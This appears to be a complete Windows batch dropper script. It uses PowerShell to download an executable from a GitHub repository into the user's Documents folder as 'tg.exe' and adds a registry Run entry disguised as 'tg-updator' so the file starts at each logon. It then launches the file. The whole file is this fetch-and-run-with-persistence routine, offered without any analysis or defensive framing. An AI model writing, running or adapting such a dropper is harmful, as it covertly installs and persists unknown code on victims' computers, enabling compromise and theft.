@echo off
for /f "tokens=2 delims=\" %%i in ('whoami') do set "user=%%i"

:download
PowerShell -Command "Invoke-RestMethod -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\%user%\Documents\tg.exe'"
if ERRORLEVEL 1 (
	PowerShell -Command "Invoke-RestMethod -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\%user%\Documents\tg.exe'"
	if ERRORLEVEL 1 ( 
		PowerShell -Command "Invoke-WebRequest -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\%user%\Documents\tg.exe'"
	)
)
:check
if exist "C:\Users\%user%\Documents\tg.exe" (
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "tg-updator" /t REG_SZ /d "C:\Users\%user%\Documents\tg.exe" /f  
	start "" "C:\Users\%user%\Documents\tg.exe"  	
) else ( 
	timeout /t 1 >nul
	goto check
)

